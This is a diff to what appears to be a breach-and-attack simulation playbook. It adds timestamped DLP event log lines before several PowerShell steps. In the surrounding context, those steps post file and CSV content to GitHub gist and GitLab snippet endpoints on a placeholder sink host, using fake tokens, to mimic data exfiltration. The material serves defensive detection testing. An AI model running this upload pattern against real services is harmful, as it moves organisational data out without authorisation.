@@ -71,6 +71,7 @@ steps:
       $body = @{ description = 'bas-sim'; public = $false; files = $files } | ConvertTo-Json -Depth 5 -Compress
       $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/github/gists"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Post -Body $body `
           -Headers @{ 'Authorization' = 'token bas-sim-fake-pat-0000000000000000' } `
           -ContentType 'application/json' -TimeoutSec 10 | Out-Null
@@ -115,6 +116,7 @@ steps:
       $body = @{ title = 'bas-sim'; visibility = 'private'; file_name = "$token.dat"; content = $csvContent } | ConvertTo-Json -Compress
       $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/gitlab/api/v4/snippets"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Post -Body $body `
           -Headers @{ 'PRIVATE-TOKEN' = 'bas-sim-fake-token-0000000000000000' } `
           -ContentType 'application/json' -TimeoutSec 10 | Out-Null
@@ -156,6 +158,7 @@ steps:
       $body = @{ description = 'bas-sim'; public = $false; files = $files } | ConvertTo-Json -Depth 5 -Compress
       $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/github/gists"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Post -Body $body `
           -Headers @{ 'Authorization' = 'token bas-sim-fake-pat-0000000000000000' } `
           -ContentType 'application/json' -TimeoutSec 10 | Out-Null
@@ -201,6 +204,7 @@ steps:
       $body = @{ description = 'bas-sim'; public = $false; files = $files } | ConvertTo-Json -Depth 5 -Compress
       $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/github/gists"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Post -Body $body `
           -Headers @{ 'Authorization' = 'token bas-sim-fake-pat-0000000000000000' } `
           -ContentType 'application/json' -TimeoutSec 10 | Out-Null
@@ -245,6 +249,7 @@ steps:
       $body = @{ title = 'bas-sim'; visibility = 'private'; file_name = "$token.dat"; content = $payload } | ConvertTo-Json -Compress
       $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/gitlab/api/v4/snippets"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Post -Body $body `
           -Headers @{ 'PRIVATE-TOKEN' = 'bas-sim-fake-token-0000000000000000' } `
           -ContentType 'application/json' -TimeoutSec 10 | Out-Null
@@ -285,6 +290,7 @@ steps:
       $body = @{ title = 'bas-sim'; visibility = 'private'; file_name = "$token.dat"; content = $payload } | ConvertTo-Json -Compress
       $uri = "https://{{SINK_WEBHOOK_HOST}}:{{SINK_WEBHOOK_PORT}}/webhooksink/gitlab/api/v4/snippets"
       try {
+        if ($env:BAS_TASK_ID) { Write-Output "DLP_EVENT_START: $env:BAS_TASK_ID $((Get-Date).ToUniversalTime().ToString('o'))" }
         Invoke-RestMethod -Uri $uri -Method Post -Body $body `
           -Headers @{ 'PRIVATE-TOKEN' = 'bas-sim-fake-token-0000000000000000' } `
           -ContentType 'application/json' -TimeoutSec 10 | Out-Null
